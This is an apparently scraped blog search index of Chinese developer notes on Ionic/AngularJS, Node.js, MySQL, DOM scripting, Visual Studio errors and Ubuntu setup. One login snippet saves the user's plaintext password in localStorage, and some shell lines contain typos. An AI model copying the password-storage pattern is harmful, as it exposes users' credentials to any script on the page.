    <title><![CDATA[破万卷APP总结三]]></title>
    <url>%2F2017%2F04%2F15%2Ffirst%2F</url>
    <content type="text"><![CDATA[Android手机加载超时Application Error - The connection to the server was unsuccessful.(file:///android_asset/www/index.html)解决办法：把index.html更名为main.html，然后新建一个index.html页面，内容如下：&lt;!doctype html&gt; tittle window.location=’./main.html’; 主要原理就是通过一个过渡页面，把加载首页的内容最小化。 bodyparser错误body-parser deprecated bodyParser: use individual json/urlencoded middlewares express1.js:4:9body-parser deprecated undefined extended: provide extended option node_modules\body-parser\index.js:75:29express deprecated res.send(status): Use res.status(status).end() instead express1.js:6:6解决办法：// parse application/x-www-form-urlencodedapp.use(bodyParser.urlencoded({ extended: false }))// parse application/jsonapp.use(bodyParser.json()) nodejs使用MySQL的问题尽量使用连接池，这样不会自动断开。在使用连接池时要注意，释放连接，不然会导致后面的业务无法处理。一般有十个pool，这个可以自行设置。 123456789101112var mysql = require('mysql');var pool = mysql.createPool(config);pool.getConnection(function(err, connection) &#123; // Use the connection connection.query( 'SELECT something FROM sometable', function(err, rows) &#123; // And done with the connection. connection.release(); // Don't use the connection here, it has been returned to the pool. &#125;);&#125;); 有些网站基本都使用connection.end(),但本人认为这样会导致一些后果。npm官网的使用方法则是release();]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[破万卷APP总结二]]></title>
    <url>%2F2017%2F04%2F11%2Ffirst%2F</url>
    <content type="text"><![CDATA[使用cordova外来插件安装ngCordova库，可使用开发的第三方插件。ngCordova库下载链接：http://pan.baidu.com/s/1c2f7c0S 密码：fl861、引入ng-cordova.js文件把 ng-cordova.js 或者 ng-cordova.min.js引入index.html中并放在cordova.js之前， AngularJS Ionic 文件之后 (因为ngCordova d依赖AngularJS).“lib/ngCordova/dist/ng-cordova.js” “cordova.js” 2、引入ng-cordova的依赖在主程序的app.js中引入ng-cordova的依赖angular.module(‘myApp‘, [‘ngCordova‘])3、添加插件到你的Cordova CLI环境中 用到那个添加那个cordova plugin add … error: unknown host service辨别电脑的5037端口被哪个应用程序占用，如果5037端口被占用，找到他删掉进程。 window.localStorage添加一个angularjs服务123456789101112131415161718//本地存储数据===================================.factory('locals',['$window',function($window)&#123; return&#123; //存储单个属性 set :function(key,value)&#123; $window.localStorage[key]=value; &#125;, //读取单个属性 get:function(key,defaultValue)&#123; return $window.localStorage[key] || defaultValue; &#125;, //存储对象，以JSON格式存储 setObject:function(key,value)&#123; $window.localStorage[key]=JSON.stringify(value); &#125;, //读取对象 getObject: function (key) &#123; return JSON.parse($window.localStorage[key] || '&#123;&#125;'); &#125; &#125; &#125;]); 服务依赖注入到angularjs控制器1234567.controller('loginController',function($scope, $ionicPopup, $state,locals)&#123;//存储数据 locals.set("username",user.username); locals.set("password",user.password); //读取数据 console.log(locals.get("username","")); localStorage - 没有时间限制的数据存储,需要人为来清空，window.localStorage.clear()或者.removeItem(key)sessionStorage - 针对一个 session 的数据存储 关于表单的作用域作用域的原型继承是非常简单普遍的，甚至你不必关心它的运作。直到你在子作用域中向父作用域的原始类型属性使用双向数据绑定，比如Form表单的ng-model为父作用域中的属性，且为原始类型，输入数据后，它不会如你期望的那样运行——AngularJS不会把输入数据写到你期望的父作用域属性中去，而是直接在子作用域创建同名属性并写入数据。这个行为符合JavaScript原型继承机制的行为。AngularJS新手通常没有认识到ng-repeat、 ng-switch、ng-view和ng-include 都会创建子作用域, 所以经常出问题。避免这个问题的最佳实践是在ng-model中总使用.。AngularJS存在四种作用域:1、普通的带原型继承的作用域 – ng-include, ng-switch, ng-controller, directive with scope: true；2、普通的带原型继承的，并且有赋值行为的作用域 – ng-repeat，ng-repeat为每一个迭代项创建一个普通的有原型继承的子作用域，但同时在子作用域中创建新属性存储迭代项；3、“Isolate”作用域 – directive with scope: {…}， 该作用域没有原型继承，但可以通过’=’, ‘@’, 和 ‘&amp;’与父作用域通信。4、“transcluded”作用域 – directive with transclude: true，它也是普通的带原型继承的作用域，但它与“Isolate”作用域是相邻的好基友。 常用指令ng-show,ng-hide,ng-if,ng-disabled,ng-switch-when,ng-class,ng-src,ng-repeat,ng-options，ng-click,ng-doubleclick,ng-mouseover. ng-style使用filter错误的写法:123&lt;div class="progress"&gt; &lt;div class="bar bar-success" style="width:&#123;&#123;user.used | percent:user.total&#125;&#125;"&gt;&lt;/div&gt;&lt;/div&gt; 这可能是因为在刚开始渲染页面时, user的值还没有获取到, 所以width一直为0. 后来获取到user的值了, 但界面已经不能自动更新了导致的.正确的写法:1234&lt;div class="progress"&gt; &lt;div class="bar bar-success" ng-style="&#123;'width': (user.used | percent:user.total)&#125;"&gt;&lt;/div&gt;&lt;/div&gt; 因为ng-style是angular自己的指令, 它会监听user的变化, 并输出层div的style属性, 所以是正确的.注意, 在ng-style中使用filter: (user.used | percent: user.total) tabs只调用一次controllerionic如果你使用tabs为abstract的话，默认是缓存页面的，可以在state里面设置禁用缓存：cache: false]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html DOM操作]]></title>
    <url>%2F2017%2F04%2F06%2Ffirst%2F</url>
    <content type="text"><![CDATA[获取DOM结构123document.getElementsByTagName('div');//通过标签名获取DOM数组document.getElementById('wo');//通过ID直接获取DOMdocument.getElementsByName('name')//通过name获取DOM列表 创建DOM结构123document.createElement("p");//创建元素节点对象document.createTextNode("文字");//创建文本节点对象document.createAttribute("href");//创建属性节点 获取或设置节点nodeName:获取节点的名称，是只读的nodeValue:获取或设置节点的值nodeType:节点的类型，是只读的。1、表示元素，2、表示属性，3、表示文本，8、表示注释，9、表示文档。 添加节点appendChild(node)在当前节点内部最后一个子节点后面添加新的子节点，参数为新的子节点insertBefore(newNode,node)在当前节点内部指定的子节点之前添加新的子节点，第一个参数为新的子节点，第二个参数为当前节点内部指定的子节点insertAfter()在当前节点内部指定的子节点之后添加新的子节点，第一个参数为新的子节点，第二个参数为当前节点内部指定的子节点setAttributeNode()在当前元素节点设置属性节点，邀请调用此方法的节点的类型为元素类型，参数要设置的属性节点 示例1添加节点123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;使用DOM创建并添加节点&lt;/title&gt;&lt;script type="text/javascript"&gt;function createAndAddNode()&#123;//div标签元素节点var container = document.body.getElementsByTagName("div")[0];//创建元素节点对象，元素名即标签名 &lt;p&gt;var pEle = document.createElement("p");//创建文本节点对象，文本内容就是参数值var txtOfP = document.createTextNode("这是段落的文字");//在元素节点内部添加一个文本节点&lt;p&gt;这是段落的文字pEle.appendChild(txtOfP);//在div元素节点后面添加新的子节点。&lt;div&gt;&lt;p&gt;这是段落的文字&lt;/div&gt;container.appendChild(pEle);//创建一个超链接标签节点var aEle = document.createElement("a");//创建文本节点var txtOfA = document.createTextNode("博客园");//在元素节点中添加文本节点，&lt;a&gt;博客园&lt;/a&gt;aEle.appendChild(txtOfA);//创建一个href属性节点var attrOfA = document.createAttribute("href");//将href属性节点设置其属性值attrOfA.nodeValue = "http:www.cnblogs.com";//将属性节点添加到超链接元素节点中,即设置a元素标签的属性节点aEle.setAttributeNode(attrOfA);//将元素节点a添加到div中container.appendChild(aEle);&#125;//浏览器窗口加载时调用该方法window.onload = createAndAddNode;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 示例2修改节点12345678910111213141516171819202122232425262728&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;使用DOM改变节点&lt;/title&gt;&lt;script type="text/javascript"&gt;function changeSize()&#123;var target = document.getElementById("txt_1");//设置列的属性值为50target.setAttribute("cols", "50");//设置行的属性值为6 先访问属性节点集合，然后通过getNamedItem定位属性名，target.attributes.getNamedItem("rows").nodeValue = "6";&#125;function changeText() &#123;var target = document.getElementById("lbl_1");//先访问该元素节点的子节点，子节点个数可以是多个，因此用了数组下标访问指定元素。然后通过nodeValue修改其值target.childNodes[0].nodeValue = "您的个人简历：";&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=""&gt;&lt;label id="lbl_1" for="txt_1"&gt;多行文本框的标签文字&lt;/label&gt;&lt;textarea id="txt_1" &gt;&lt;/textarea&gt;&lt;input type="button" name="btn" value="改变多行文本域的尺寸" onclick="changeSize();" /&gt;&lt;input type="button" name="btn" value="改变标签的文字" onclick="changeText();" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 示例3删除节点123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;&lt;title&gt;使用DOM删除节点&lt;/title&gt;&lt;script type="text/javascript"&gt;function doRemoveNode() &#123;//label标签元素节点var targetLbl = document.getElementById("lbl_1");//从label元素节点中删除第一个子节点targetLbl.removeChild(targetLbl.firstChild);//文档元素，通过访问文档元素集合，指定位置元素获得多行文本域var tagetArea = document.documentElement.getElementsByTagName("textarea")[0];//文档中第一个form标签元素节点var tagetForm = document.documentElement.getElementsByTagName("form")[0];//删除文档中第一个form标签中的textareatagetForm.removeChild(tagetArea);&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form&gt;&lt;label id="lbl_1" for="txt_1"&gt;多行文本框的标签文字&lt;/label&gt;&lt;textarea id="txt_1" rows="" cols=""&gt;&lt;/textarea&gt;&lt;input type="button" name="btn" value="删除节点" onclick="doRemoveNode();"/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>html</category>
        <category>DOM</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[photoshop快捷键操作]]></title>
    <url>%2F2017%2F04%2F06%2Fsecond%2F</url>
    <content type="text"><![CDATA[建立图层ctrl+N创建图层 打开智能参考线视图–&gt;显示–&gt;智能参考线 数值单位和文字单位编辑–&gt;首选项–&gt;常规打开设置窗口或者Ctrl+K迅速打开界面选择单位与标尺改变标尺单位或者文字单位。 解锁图层双击图层解锁 设置前景色和背景色设置前景色和背景色后可以快捷键直接填充，ctrl+delete是填充背景色，alt+delete是填充前景色 图层对应勾选自动选择，则可以点击图形到对应图层。 变形Ctrl+T变形，shift+alt等比例扩大或者缩小，编辑–&gt;变换 显示变换控件勾选显示变换控件，则可以改变矩形大小。 显示隐藏参考线Ctrl+; 复制图层alt+鼠标拖拽，Ctrl+J快速复制(复制后的在原图层的上面). 取消选区Ctrl+D 显示隐藏选区Ctrl+H]]></content>
      <categories>
        <category>UI</category>
        <category>Photoshop</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[visual studio遇到的问题]]></title>
    <url>%2F2017%2F04%2F03%2Ffirst%2F</url>
    <content type="text"><![CDATA[问题一无法计算“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\MSBuild\ToolsVersions\12.0@VCTargetsPath”处的属性表达式“\$([MSBuild]::ValueOrDefault(‘\$(VCTargetsPath)’,’\$(MSBuildExtensionsPath32)\Microsoft.Cpp\v4.0\V120\’))”的值。静态方法调用语法“[MSBuild]::ValueOrDefault(‘\$(VCTargetsPath)’,’\$(MSBuildExtensionsPath32)\Microsoft.Cpp\v4.0\V120\’)”无效解决方案:打开windows+R输入regedit，进入注册表找到：HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\MSBuild\ToolsVersions路径存在12.0的文件夹则删除掉即可，删除后应该如下图： 问题二 error MSB8020: The builds tools for v120 (Platform Toolset = ‘v120’) cannot be found. To build using the v120 build tools, either click the Project menu or right-click the solution, and then select “Update VC++ Projects…”​解决方案: 1.在所在的项目工程下单击右键：2.属性–&gt;配置属性–&gt;常规–&gt;平台工具集–&gt;Visual Studio 2012(v110)即可 问题三error : Required file tracker.exe is missing其实就是找到你的项目文件xxxx.vcxproj,使用编辑器打开，是xml格式的定义文件，查找关键字PropertyGroup会发现有几个这样的配置，然后在这样的关键附近插入如下代码：1234&lt;!-- for example in the project file --&gt; &lt;PropertyGroup&gt; &lt;TrackFileAccess&gt;false&lt;/TrackFileAccess&gt; &lt;/PropertyGroup&gt; 加入后，我的项目文件的代码定义像下面这个样子：1234567891011121314151617&lt;/ItemGroup&gt; &lt;PropertyGroup&gt; &lt;TrackFileAccess&gt;false&lt;/TrackFileAccess&gt; &lt;/PropertyGroup&gt; &lt;PropertyGroup Label="Globals"&gt; &lt;ProjectGuid&gt;&#123;325EC88B-5F85-493D-92C0-E5CEBCA0BB39&#125;&lt;/ProjectGuid&gt; &lt;RootNamespace&gt;MFCQQChat&lt;/RootNamespace&gt; &lt;Keyword&gt;MFCProj&lt;/Keyword&gt; &lt;/PropertyGroup&gt; &lt;Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" /&gt; &lt;PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration"&gt; &lt;ConfigurationType&gt;Application&lt;/ConfigurationType&gt; &lt;UseDebugLibraries&gt;true&lt;/UseDebugLibraries&gt; &lt;PlatformToolset&gt;v110_xp&lt;/PlatformToolset&gt; &lt;CharacterSet&gt;Unicode&lt;/CharacterSet&gt; &lt;UseOfMfc&gt;Static&lt;/UseOfMfc&gt; &lt;/PropertyGroup&gt;]]></content>
      <categories>
        <category>csharp</category>
      </categories>
      <tags>
        <tag>解决方案</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL语句笔记]]></title>
    <url>%2F2017%2F03%2F31%2Ffirst%2F</url>
    <content type="text"><![CDATA[sql语句实用123456789&gt; select 'true' as isfromme from ceshi;&gt; select name,case when when id=1 then 'true' else 'false' end isfrome from ceshi;&gt; select sid,rid,message,isread from userchat where sid=7 and (rid in (select uid2 from friend where uid1=7) or rid in (select uid1 from friend where uid2=7)) or (sid in (select uid2 from friend where uid1=7) or sid in (select uid1 from friend where uid2=7)) and rid=7;&gt; select case when uid1=7 then uid2 else uid1 end uid from friend where uid1=7 or uid2=7;&gt; select uid,uname,uimage from user where uid in (select case when uid1=7 then uid2 else uid1 end uid from friend where uid1=7 or uid2=7)&gt; select count(isread=0),message lastmessage,date_format(time,'%Y-%c-%d %h:%i:%s') time from userchat where rid=7 and sid=9 or rid=9 and sid=7 GROUP BY isread,message,time ORDER BY time desc LIMIT 1;&gt; select count(isread=0 or null) from userchat where rid=?&gt; select fid,uname,uimage,signature from follow a inner join user b on a.fid=b.uid where a.uid=7;]]></content>
      <categories>
        <category>关系型数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>实用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[混合式APP破万卷总结(一)]]></title>
    <url>%2F2017%2F03%2F28%2Ffirst%2F</url>
    <content type="text"><![CDATA[ionic路由问题路由分母版路由和非母版路由12345.state('tab',&#123; url:'tab', abstract:true, templateUrl:'templates/tabs.html'&#125;) 我们看tab的这个路由，url就是路由地址，abstract：true就是指设置这个界面为母版界面，可以这么理解，这是一个架子，所有的子界面都有这个统一的界面。看另一个路由界面123456789.state('tab.dash',&#123; url:'/dash', views:&#123; 'tab-dash':&#123; templateUrl:'templates/tab-dash.html', controller:'DashCtrl'&#125;&#125; &#125;) 首先是这个路由的名字tab.dash这里的点和js中的点一样理解为对象的属性，这里表示一种从属关系。指dash这个视图是tab的一个子视图。这个路由配置和tab的路由配置有个明显不同的地方就是多了一个views，可以简单理解为用来定义视图详情。格式是views:{name:{parms}}这里最应该关注的就是‘tab-dash’这个视图名字。首先要指导这个视图名字是从哪来的，又是什么意思？ 我们打开tabs.html文件12345&lt;ion-tabs&gt;&lt;ion-tab title="Status"&gt;&lt;ion-nav-view name="tab-dash"&gt;&lt;/ion-nav-view&gt;&lt;/ion-tab&gt;&lt;/ion-tabs&gt; 可以看到在tabs地下定义的tab里面有一个ion-nav-view 它的名字定义为‘tab-dash’这个意思就是。tab.dash这个路由定义了，这个路由的视图是在‘tab-dash’这个tab的视图里面绘制的。这个ion-nav-view我们在index.html中也有见过。那这里要怎么理解呢？我们对代码做一点小改动。改动tab的配置。加入views属性。123456789.state('tab',&#123; url:'/tab', views:&#123; 'main':&#123; abstract:true, templateUrl:'templates/tabs.html' &#125;&#125;&#125;) 然后给index.html中的加入属性name=’main’。1&lt;ion-nav-view name="main"&gt;&lt;/ion-nav-view&gt; 然后运行项目，项目运行成功。给每一个视图定义了名字之后，理解起来就容易很多了。下面我画一个简单的图来说明这几个关系。 ion-list,ion-item这个两个控件非常不好用，建议用ionic class1234567891011121314151617181920212223242526&lt;div class="list text"&gt; &lt;a class="item item-icon-left item-icon-right" href="#"&gt; &lt;i class="icon ion-ios-people-outline"&gt;&lt;/i&gt; 我的书友 &lt;i class="icon ion-ios-arrow-forward"&gt;&lt;/i&gt; &lt;/a&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-ios-monitor-outline"&gt;&lt;/i&gt; 我的关注 &lt;/a&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-ios-chatbubble-outline"&gt;&lt;/i&gt; 我的消息 &lt;span class="badge badge-assertive"&gt;10&lt;/span&gt; &lt;/a&gt; &lt;a class="item item-icon-left" href="#"&gt; &lt;i class="icon ion-ios-cloud-outline"&gt;&lt;/i&gt; 动态 &lt;span class="badge badge-assertive"&gt;10&lt;/span&gt; &lt;/a&gt;&lt;/div&gt; 键盘有无监听并隐藏和显示tab1234567891011121314151617181920212223242526angular.module('starter', ['ionic','starter.controllers','starter.routers','starter.directives']).run(function($ionicPlatform,$rootScope) &#123; $ionicPlatform.ready(function() &#123; if(window.cordova &amp;&amp; window.cordova.plugins.Keyboard) &#123; cordova.plugins.Keyboard.hideKeyboardAccessoryBar(true); cordova.plugins.Keyboard.disableScroll(true); &#125; if(window.StatusBar) &#123; StatusBar.styleDefault(); &#125; &#125;); window.addEventListener('native.keyboardshow', function keyboardShowHandler(e)&#123; $rootScope.hideta = 'tabs-item-hide';&#125;); window.addEventListener('native.keyboardhide', function keyboardHideHandler(e)&#123; $rootScope.hideta = '';&#125;);&#125;).config(['$ionicConfigProvider', function($ionicConfigProvider) &#123; ionic.Platform.isFullScreen = false; $ionicConfigProvider.platform.ios.tabs.style('standard'); $ionicConfigProvider.platform.ios.tabs.position('bottom'); $ionicConfigProvider.platform.android.tabs.style('standard'); $ionicConfigProvider.platform.android.tabs.position('standard');&#125;]) 侧栏和主界面的bar-header和bar-subheader可以让侧栏和主界面融合在一起 好看的字体,圆形图片1234567891011.text &#123; font-family: "Arial","Microsoft YaHei","黑体","宋体","sans-serif";&#125;.set-img-login&#123; width: 100px; height: 100px; border: 4px solid #ccc; border-radius: 50%; background: url('../img/ionic.png'); margin:0 auto;&#125; 关于即用bar-header又用bar-subheader覆盖content内容解决办法12345678910111213&lt;ion-header-bar align-title="left" class="bar-positive"&gt; &lt;div class="buttons"&gt; &lt;button class="button" ng-click="doSomething()"&gt;Left Button&lt;/button&gt; &lt;/div&gt; &lt;h1 class="title"&gt;Header&lt;/h1&gt; &lt;div class="buttons"&gt; &lt;button class="button"&gt;Right Button&lt;/button&gt; &lt;/div&gt; &lt;/ion-header-bar&gt; &lt;ion-header-bar align-title="left" class="bar-subheader bar-positive"&gt; &lt;h1 class="title"&gt;Sub Header!&lt;/h1&gt; &lt;/ion-header-bar&gt; 关于Error Initializing app: There was an error with the spawned command: npminstall使用ionic start project blank –skip-npm开始项目 关于angularjs表单验证涉及表单指令的有最小长度：ng-minlength=”4”最大长度：ng-maxlength=”16”模式匹配：ng-pattern”/^[0-9]{11}\$/“必填项：required数字:number邮箱:emailurl：url涉及内容修改与验证是否通过\$pristine 没修改\$dirty 修改过\$invalid 验证失败\$valid 验证成功\$error 错误详情举例：12345myForm.pattern.\$pristine 未修改myForm.pattern.\$dirty 修改myForm.pattern.\$invalid 验证失败myForm.pattern.\$valid 验证成功myForm.pattern.\$error 错误详情 实例:12345678910111213141516171819202122232425&lt;form name="login" novalidate&gt; &lt;div class="list list-inset"&gt; &lt;label class="item item-input"&gt; &lt;input type="text" placeholder="手机号" name="phone" ng-pattern="/^[0-9]&#123;11&#125;$/" ng-model="uphone" required&gt; &lt;i class="icon ion-android-close assertive ion" ng-show="login.phone.$dirty &amp;&amp;login.phone.$invalid"&gt;&lt;/i&gt; &lt;i class="icon ion-android-done balanced ion" ng-show="login.phone.$dirty&amp;&amp;login.phone.$valid" &gt;&lt;/i&gt; &lt;/label&gt; &lt;label class="item item-input"&gt; &lt;input type="password" placeholder="密码" name="password" ng-model="upassword" ng-minlength="8" ng-maxlength="16" required&gt; &lt;i class="icon ion-android-close assertive ion" ng-show="login.password.$dirty &amp;&amp;login.password.$invalid"&gt;&lt;/i&gt; &lt;i class="icon ion-android-done balanced ion" ng-show="login.password.$dirty&amp;&amp;login.password.$valid" &gt;&lt;/i&gt; &lt;/label&gt; &lt;button class="button button-block button-calm" ng-disabled="login.password.$dirty &amp;&amp;login.password.$invalid || login.phone.$dirty &amp;&amp;login.phone.$invalid || login.password.$pristine || login.phone.$pristine" ng-click="login()"&gt; 登录&lt;/button&gt;&lt;div class="row"&gt; &lt;a class="button button-clear button-positive col" href="#/register"&gt; 注册账号&lt;/a&gt; &lt;a class="button button-clear button-positive col" href="#/forget"&gt; 忘记密码&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/form&gt; ng-show辅助显示，ng-disabled辅助禁止。 关于ionicView执行顺序12345678910111213141516171819202122232425$scope.$on('$ionicView.loaded', function() &#123; console.log("$ionicView.loaded");&#125;);$scope.$on('$ionicView.beforeEnter', function() &#123; console.log("$ionicView.beforeEnter");&#125;);$scope.$on("$ionicView.enter", function() &#123; console.log("$ionicView.enter");&#125;);$scope.$on('$ionicView.afterEnter', function() &#123; console.log("$ionicView.afterEnter");&#125;); $scope.$on('$ionicView.beforeLeave', function() &#123; console.log("$ionicView.beforeLeave");&#125;);$scope.$on('$ionicView.leave', function() &#123; console.log("$ionicView.leave");&#125;);$scope.$on('$ionicView.afterLeave', function() &#123; console.log("$ionicView.afterLeave");&#125;);$scope.$on('$ionicView.unloaded', function() &#123; console.log("$ionicView.unloaded");&#125;); \$ionicView.loaded视图已经被加载了。这事件只发生一次当视图被创建并添加到Dom中。当跳出页面并且被缓存了的话，再次访问这个页面时这个时间将不会被激活。Loaded事件是个好方式让你为这个视图设置你的代码； 然而，他并不是我们推荐的时间去监听视图被激活。\$ionicView.enter进入视图并被激活。这事件被激活来判断这个视图是第一个加载还是被缓存了的。\$ionicView.leave离开这个视图并且不是活动页面。调用这个事件判断应该被缓存还是摧毁。\$ionicView.beforeEnter视图即将被打开变成活动页面。\$ionicView.beforeLeave视图将被关闭并且不是活动页面。\$ionicView.afterEnter进入视图并是当前的活动页面\$ionicView.afterLeave已经离开视图，并成为非激活页面\$ionicView.unloaded视图的Controller已经被摧毁并且他的页面元素也从Dom中移除]]></content>
      <categories>
        <category>破万卷APP</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel技术问题总结(一)]]></title>
    <url>%2F2017%2F03%2F26%2Fthird%2F</url>
    <content type="text"></content>
      <categories>
        <category>PHP</category>
        <category>Laravel</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EffectWork技术总结(一)]]></title>
    <url>%2F2017%2F03%2F26%2Fsecond%2F</url>
    <content type="text"><![CDATA[问题一遇到:SyntaxError: Use of const in strict mode用Node.js的时候使用connect-mongo这个模块的时候出现SyntaxError: Use of const in strict mode这个错误，看了一下其中src/index.js的代码，使用了const、let、”use strict”这些高大上的东西，我的解决方法是：把connect-mongo版本降低一点，别用最新版。删除node_modules文件夹，package.json中把connect-mongo这一条删了，换成”connect-mongo”: “0.4.1”（用低版本的）然后npm install。]]></content>
      <categories>
        <category>EffectWork</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux问题总结(一)]]></title>
    <url>%2F2017%2F03%2F26%2Ffirst%2F</url>
    <content type="text"><![CDATA[进程管理ubuntu端口管理1、查看该端口对应的服务netstat -auntp | grep your_port2、杀死进程kill PID 服务器后台执行命令1、&amp;当在前台运行某个作业时，终端被该作业占据；可以在命令后面加上&amp; 实现后台运行。例如：sh test.sh &amp;如果放在后台运行的作业会产生大量的输出，最好使用下面的方法把它的输出重定向到某个文件中：command &gt; out.file 2&gt;&amp;1 &amp;2、nohup命令使用&amp;命令后，作业被提交到后台运行，当前控制台没有被占用，但是一但把当前控制台关掉(退出帐户时)，作业就会停止运行。nohup命令可以在你退出帐户之后继续运行相应的进程。nohup就是不挂起的意思( no hang up)。该命令的一般形式为： nohup command &amp;如果使用nohup命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中，除非另外指定了输出文件：使用sh nohup.sh 执行，当前命令行就会hang住使用sh nohup.sh &amp; 执行，就会把作业提交到后台，释放当前命令行，同时显示了进程号；但是如果帮当前命令窗口关闭，整个作业就停止了使用nohup sh nohup.sh &gt; log 2&gt;1 &amp; ，同样把作业提交到后台，释放当前窗口；而且即使把当前命令窗口关闭，作业仍然运行。3、jobs查看当前有多少在后台运行的命令。jobs -l选项可显示所有任务的PID，jobs的状态可以是running, stopped, Terminated。4、bg将一个在后台暂停的命令，变成在后台继续执行。如果后台中有多个命令，可以用bg %jobnumber将选中的命令调出。5、fg将后台中的命令调至前台继续运行。如果后台中有多个命令，可以用fg %jobnumber（是命令编号，不是进程号）将选中的命令调出。 ubuntu安装redis1、输入命令apt-get install redis-server2、检查是否启动ps -aux | grep redis3、通过启动命令检查Redis服务器状态netstat -nlt | grep 63794、进入客户端shellredis_cli Linux的硬链接和软链接ln -s 源文件 目标文件 软链接ln 源文件 目标文件 硬链接第一，ln命令会保持每一处链接文件的同步性，也就是说，不论你改动了哪一处，其它的文件都会发生相同的变化；第二，ln的链接又软链接 和硬链接两种，软链接就是ln -s ,它只会在你选定的位置上生成一个文件的镜像，不会占用磁盘空间，硬链接ln ,没有参数-s, 它会在你选定的位置上生成一个和源文件大小相同的文件，无论是软链接还是硬链接，文件都保持同步变化。如果你用ls察看一个目录时，发现有的文件后面有一个@的符号，那就是一个用ln命令生成的文件，用ls -l命令去察看，就可以看到显示的link的路径了。软链接:1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式2.软链接可以 跨文件系统 ，硬链接不可以3.软链接可以对一个不存在的文件名进行链接4.软链接可以对目录进行链接硬链接:1.硬链接，以文件副本的形式存在。但不占用实际空间。2.不允许给目录创建硬链接3.硬链接只有在同一个文件系统中才能创建命令参数:-b 删除，覆盖以前建立的链接-d 允许超级用户制作目录的硬链接-f 强制执行-i 交互模式，文件存在则提示用户是否覆盖-n 把符号链接视为一般目录-s 软链接(符号链接)-v 显示详细的处理过程说明:1.源文件被删除后，并没有影响硬链接文件；软链接文件在centos系统下不断的闪烁，提示源文件已经不存在 2.重建源文件后，软链接不在闪烁提示，说明已经链接成功，找到了链接文件系统；重建后，硬链接文件并没有受到源文件影响，硬链接文件的内容还是保留了删除前源文件的内容，说明硬链接已经失效 ubuntu解压缩tar.gz和tar.gz2在压缩率方面做得非常好。1、ZIP压缩和解压压缩目录zip -r archive_name.zip directory_to_compress下面是如果解压一个zip文档：unzip archive_name.zip2、TAR打包和解包打包目录tar -cvf archive_name.tar directory_to_compress解包 tar -xvf archive_name.tar.gz指定解包路径tar -xvf archive_name.tar -C /tmp/extract_here/3、TAR.GZ压缩目录tar -zcvf archive_name.tar.gz directory_to_compress解压缩tar -zxvf archive_name.tar.gz4、TAR.BZ2这种压缩格式是我们提到的所有方式中压缩率最好的。压缩目录 tar -jcvf archive_name.tar.bz2 directory_to_compress解压缩tar -jxvf archive_name.tar.bz2 -C /tmp/extract_here/ Ubuntu安装nodejsnodejs压缩包解压缩移动到usr/local/node目录下:mv xxx /usr/local/node/更改权限:chmod 755 /usr/local/node/* -R进入node bin目录执行脚本./node -v ./npm -v配置node环境变量执行nano ~./bashrc,对此文件进行修改末尾加两行export NODE=/usr/local/nodeexport PATH=${NODE}:/bin:$PATH然后保存执行命令source ~./bashrc配置完成 Ubuntu mysql配置运行sudo apt-get update进行安装sudo apt-get install mysql-server mysql-client开启服务sudo service mysql restart让apache支持mysql执行命令 sudo apt-get install libapache2-mod-auth-mysql让php支持mysql执行命令 sudo apt-get install php5-mysql Ubuntu安装mongodb]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>理解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThinkPHP源码研究(一)]]></title>
    <url>%2F2017%2F03%2F25%2Ffirst%2F</url>
